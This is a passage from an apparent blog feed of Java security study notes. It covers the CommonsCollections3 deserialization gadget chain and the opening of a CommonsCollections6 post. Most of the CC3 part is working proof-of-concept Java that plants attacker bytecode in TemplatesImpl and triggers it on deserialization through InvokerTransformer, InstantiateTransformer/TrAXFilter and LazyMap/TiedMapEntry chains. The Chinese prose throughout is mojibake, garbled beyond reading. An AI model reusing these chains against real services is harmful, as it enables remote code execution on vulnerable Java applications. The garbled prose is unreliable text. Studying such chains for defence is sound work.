<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>        Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-keyword">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>        Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>        bytecodes.set(templates,b);<br><br>        Field tfactory = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>)<br>        &#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;kkk&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-keyword">null</span>, (Transformer) chainedTransformer);<br><br>        Class&lt;?&gt; aih = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = aih.getDeclaredConstructor(Class.class,Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object o = declaredConstructor.newInstance(Target.class, transformedMap);<br><span class="hljs-comment">//        serialize(o);</span><br><span class="hljs-comment">//</span><br>        deserialize();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(path);<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">deserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(path);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>        Object o = ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] classBytes() <span class="hljs-keyword">throws</span> IOException &#123;<br>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;C:\\Users\\53433\\Desktop\\class\\Cattle.class&quot;</span>);<br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(buffer, <span class="hljs-number">0</span>, len);<br>        &#125;<br>        <span class="hljs-keyword">byte</span>[] classBytes = baos.toByteArray();<br>        <span class="hljs-keyword">return</span> classBytes;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/10/08/CommonsCollections3/11.png"></p><h3 id="0x05-å®˜æ–¹POC"><a href="#0x05-å®˜æ–¹POC" class="headerlink" title="0x05 å®˜æ–¹POC"></a>0x05 å®˜æ–¹POC</h3><p>emmmmï¼Œå¼„å®Œä¹‹åï¼Œä¸€çœ‹å®˜æ–¹POCï¼Œä»–å–µçš„ï¼Œä¸ä¸€æ ·ï¼Œæœ‰ä¸€ä¸ªç‚¹æ²¡æœ‰ç”¨åˆ°ï¼Œæ•²äº†ï¼Œè¿˜æ˜¯æ²¡æœ‰å®˜æ–¹çš„è·¯å­å®½å•Šï¼Œè·¯åˆèµ°çª„äº†</p><p>å®˜æ–¹è¯´ï¼Œè¿™é‡Œæ˜¯CC1çš„ä¸€ä¸ªå˜ä½“ ä½¿ç”¨<code>InstantiateTransformer</code>æ¥æ›¿æ¢äº†<code>InvokerTransformer</code></p><p>åœ¨<code>InvokerTransformer</code>è¢«ç¦ç”¨åï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è°ƒç”¨<code>newTransformer</code>çš„åœ°æ–¹ä¸èƒ½èµ°äº†ï¼Œéœ€è¦å¯»æ‰¾ä¸€ä¸ªæ–°çš„è°ƒç”¨<code>newTransformer</code>çš„åœ°æ–¹</p><p>æ‰¾ä¸€ä¸‹ï¼ˆå…¶å®æ˜¯çœ‹ä¸‹å¤§ä½¬çš„ï¼‰ï¼Œæ¥åˆ°<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrAXFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XMLFilterImpl</span> </span>&#123;<br><span class="hljs-keyword">private</span> Templates              _templates;<br>....<br>    <br>    <span class="hljs-comment">// æ„é€ å™¨ï¼Œtemplateså¯æ§</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span> TransformerConfigurationException</span>&#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();<span class="hljs-comment">// è°ƒç”¨newTransformer()</span><br>        _transformerHandler = <span class="hljs-keyword">new</span> TransformerHandlerImpl(_transformer);<br>        _useServicesMechanism = _transformer.useServicesMechnism();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¯¥ç±»å¹¶æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œä½†è¯¥ç±»çš„Classå¯ä»¥è¢«åºåˆ—åŒ–ï¼ˆåªéœ€ä¸€ç•ªæ“ä½œå³å¯ï¼‰</p><h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>æ¥åˆ°è¿™æ¡é“¾çš„é‡ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstantiateTransformer</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>&lt;<span class="hljs-title">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title">T</span>&gt;, <span class="hljs-title">T</span>&gt;, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <br>    <br>    <span class="hljs-comment">// è·å–input(ç±».class)çš„æ„é€ å™¨ï¼Œæ ¹æ®å‚æ•°ç±»å‹ï¼Œéœ€è¦æ˜¯publicï¼Œç„¶åå®ä¾‹åŒ–ï¼Œinputæ˜¯ä¸€ä¸ªClassç±»å‹</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">transform</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;? extends T&gt; input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(...);<br>            &#125;<br>            <span class="hljs-keyword">final</span> Constructor&lt;? extends T&gt; con = input.getConstructor(iParamTypes);<br>            <span class="hljs-keyword">return</span> con.newInstance(iArgs);<span class="hljs-comment">// ä¼ å…¥å‚æ•°ï¼Œæ‰§è¡Œæ„é€ å™¨</span><br>        ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¯¥ç±»å®ç°äº†<code>Serializable</code>æ¥å£ï¼Œç„¶åè¯¥ç±»çš„<code>transform</code>ä¸­æ ¹æ®<code>input</code>å’Œ<code>iParamTypes</code>è·å–è¾“å…¥çš„æ„é€ å™¨ï¼Œå¹¶è¿›è¡Œå®ä¾‹åŒ–ï¼ˆä¸”è¿™ä¸¤ä¸ªå‚æ•°éƒ½å¯æ§ï¼‰å› æ­¤å¦‚æœæœ‰ä¸€ä¸ªæ¶æ„ç±»ä¸­çš„æ„é€ å™¨ã€ä»£ç å—ã€é™æ€ä»£ç å—ä¸­å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢çš„<code>TrAXFilter</code>ï¼‰ç®€å•å®ç°ä»¥ä¸‹</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>åˆ°è¿™é‡Œï¼Œå¯ä»¥å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„</p><p><img src="/2022/10/08/CommonsCollections3/13.png"></p><p>å‰©ä¸‹çš„äº‹æƒ…ï¼Œå°±æ˜¯æ‹¼æ¥äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä»ç„¶éœ€è¦ä½¿ç”¨<code>ChainedTransformer</code>ï¼Œä¸ºä»€ä¹ˆå‘¢</p><p>å› ä¸º<code>InstantiateTransformer</code>åœ¨è°ƒç”¨tansformerçš„æ—¶å€™ï¼Œä»ç„¶éœ€è¦ä¸€ä¸ªå‚æ•°å€¼ï¼Œä¹Ÿå°±æ˜¯<code>TrAXFilter.class</code>,å¦‚æœç›´æ¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨<code>InstantiateTransformer</code>ï¼Œå°†TiedMapEntryä¸­çš„keyä½œä¸ºinputä¼ å…¥</p><p><img src="/2022/10/08/CommonsCollections3/14.png"></p><p>æ‰€ä»¥è¿™é‡Œè¿˜æ˜¯éœ€è¦å€Ÿç”¨ä¸€ä¸‹<code>ChainedTransformer</code>ï¼Œæœ€ç»ˆpocå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    Field tfactory = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>    tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>    tfactory.set(templates, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>    InstantiateTransformer instantiateTransformer = <br>        <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>        instantiateTransformer<br>    &#125;);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;111&quot;</span>);<br><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;222&quot;</span>);<br>    lazyMap.remove(<span class="hljs-string">&quot;111&quot;</span>);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,chainedTransformer);<br><br><span class="hljs-comment">//        serialize(hashMap);</span><br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡è¿™é‡Œå…¶å®ä¹Ÿå¯ä»¥ä¸ç”¨<code>ChainedTransformer</code>ï¼Œé€šè¿‡å‰é¢çš„æŠ¥é”™ï¼Œå·²çŸ¥ç›´æ¥åœ¨ä¼ å…¥<code>factory.set(lazyMap,InstantiateTransformer);</code>æ—¶ï¼Œèµ°åˆ°<code>InstantiateTransformer#transformer(Object input)</code>ï¼Œinputæ˜¯TiedMapEntryçš„keyï¼Œæ‰€ä»¥ï¼Œç›´æ¥æŠŠè¿™ä¸ªkeyå˜æˆ<code>TrAXFilter.class</code>ä¸å°±å¥½äº†ï¼Œä¸‹é¢æ˜¯ä¸ä½¿ç”¨<code>ChainedTransformer</code>çš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    Field tfactory = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>    tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>    tfactory.set(templates, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>    InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, TrAXFilter.class);<br><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;222&quot;</span>);<br>    lazyMap.remove(TrAXFilter.class);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,instantiateTransformer);<br><br><span class="hljs-comment">//        serialize(hashMap);</span><br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h3><p>å‘é‚µçˆ·ã€èŒƒçˆ·çš„å­¦ä¹ çš„ç¬¬Nå¤©ï¼ï¼ï¼ğŸ«¡</p><p>ç›®å‰æ‰€æœ‰å­¦è¿‡çš„é“¾çš„å›¾</p><p><img src="/2022/10/08/CommonsCollections3/12.png"></p><h3 id="0x06-å‚è€ƒé“¾æ¥"><a href="#0x06-å‚è€ƒé“¾æ¥" class="headerlink" title="0x06 å‚è€ƒé“¾æ¥"></a>0x06 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://www.bilibili.com/video/BV1Zf4y1F74K/?spm_id_from=333.788&vd_source=db93b94230228cb739b48f4f59e74abd">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸‰)-å¦ä¸€ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼</a></li><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections3.java">ysoserial_CommonsCollections3.java</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections6</title>
    <link href="/2022/10/01/CommonsCollections6/"/>
    <url>/2022/10/01/CommonsCollections6/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>CommonsCollections1åœ¨jdk8u71æ—¶è¢«ä¿®å¤äº†ï¼Œæ‰€ä»¥åº”è¿è€Œç”ŸCommonsCollections6<br>å…ˆå›å¿†ä¸€ä¸‹CommonsCollections1ä¸­çš„ä¸¤ç§æ–¹å¼<br><img src="/2022/10/01/CommonsCollections6/cc6_1.png"><br>å†æ¥çœ‹ä¸€ä¸‹æ–°ä»£ç ï¼š<br><img src="/2022/10/01/CommonsCollections6/cc6_2.png"><br>æ²¡æœ‰äº†<code>setValue()</code>ï¼Œè¿™å°±å¯¼è‡´æ–­äº†ä¸€æ¡<br>å¦ä¸€æ¡æ˜¯åŠ¨æ€ä»£ç†å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—çš„åŸå› ï¼Œå¯¼è‡´æ²¡åŠæ³•ä½¿ç”¨ï¼ŒåŸè°…æˆ‘è§è¯†æµ…è–„ï¼Œä¸çŸ¥é“å…¶ä¸­çš„å…·ä½“åŸç†ï¼Œä½†æ˜¯ç¨å¾®åœ¨IDEAä¸­èµ°ä¸€ä¸‹æµç¨‹ï¼Œåº”è¯¥æ˜¯èƒ½æ„Ÿè§‰å‡ºæ¥ä¸ªå¤§æ¦‚çš„</p><h4 id="æœ¬æ–‡ç¯å¢ƒ"><a href="#æœ¬æ–‡ç¯å¢ƒ" class="headerlink" title="æœ¬æ–‡ç¯å¢ƒ"></a>æœ¬æ–‡ç¯å¢ƒ</h4><ul><li>jdk8u71</li><li>commons-collections 3.2.1<h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h4>å…ˆæ¥è†œæ‹œä¸€ä¸‹å·¨ä½¬ğŸ¤©<br><img src="/2022/10/01/CommonsCollections6/cc6_3.png"><h3 id="0x01-CommonsCollections6çš„åˆ†æ"><a href="#0x01-CommonsCollections6çš„åˆ†æ" class="headerlink" title="0x01 CommonsCollections6çš„åˆ†æ"></a>0x01 CommonsCollections6çš„åˆ†æ</h3>CC6æ˜¯ä¸ºäº†ä½¿è°ƒç”¨é“¾ä¸å†è¢«JDKç‰ˆæœ¬çš„è¿›è¡Œé™åˆ¶ï¼Œä½¿ç”¨çš„ä¹Ÿéƒ½æ˜¯ä¸€äº›åŸç”ŸJDKä¸­æ¯”è¾ƒå¸¸è§çš„ä¸œè¥¿ï¼Œå‡ ä¹ä¸å¯èƒ½è¢«ç¦ç”¨ï¼Œå› æ­¤è¯¥é“¾ç”¨èµ·æ¥ä¹Ÿæ˜¯å¾ˆniceçš„ï¼Œè™½ç„¶æˆ‘æ²¡ç”¨è¿‡ï¼Œä½†æ®å¬è¯´å¾ˆå¥½ç”¨<br>ä¸Šé¢çŸ¥é“8u71ä»¥åï¼ŒLazyMapä¹‹å‰çš„è·¯è¢«æ–­äº†ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸ªç±» ç±»ä¸­æœ‰Object.get(Value)çš„åœ°æ–¹,å¹¶ä¸”Objectå¯æ§ã€Valueä¹Ÿå¯æ§<br>æ ¹æ®æç¤ºæ¥åˆ°<code>TiedMapEntry#getValue</code>ï¼Œä¸ºä»€ä¹ˆè¦æ ¹æ®æç¤ºå‘¢ï¼Œå› ä¸ºè°ƒç”¨get()æ–¹æ³•çš„åœ°æ–¹å¤ªå¤šäº†ğŸ˜³<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>.<span class="hljs-title">Entry</span>, <span class="hljs-title">KeyValue</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">super</span>();<br>    <span class="hljs-keyword">this</span>.map = map;<br>    <span class="hljs-keyword">this</span>.key = key;<br>  &#125;<br>  ...<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>mapå¯æ§ã€keyä¹Ÿå¯æ§<br>å†å‘ä¸Šï¼Œè¿˜æ˜¯è¿™ä¸ªç±»,åœ¨è¿™ä¸ªç±»çš„hashCodeä¸­è°ƒç”¨äº†getValue()<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    Object value = getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>            (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure>åˆ°äº†hashCode,å¥½åƒå°±æ¥åˆ°äº†ç†Ÿæ‚‰çš„åœ°æ–¹ï¼Œåœ¨URLDNSé“¾ä¸­ï¼Œå°±ç”¨äº†HashCode()<br>ç›´æ¥æ¥åˆ°HashMap<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HashMap</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMap</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;, <span class="hljs-title">Cloneable</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">static</span> <span 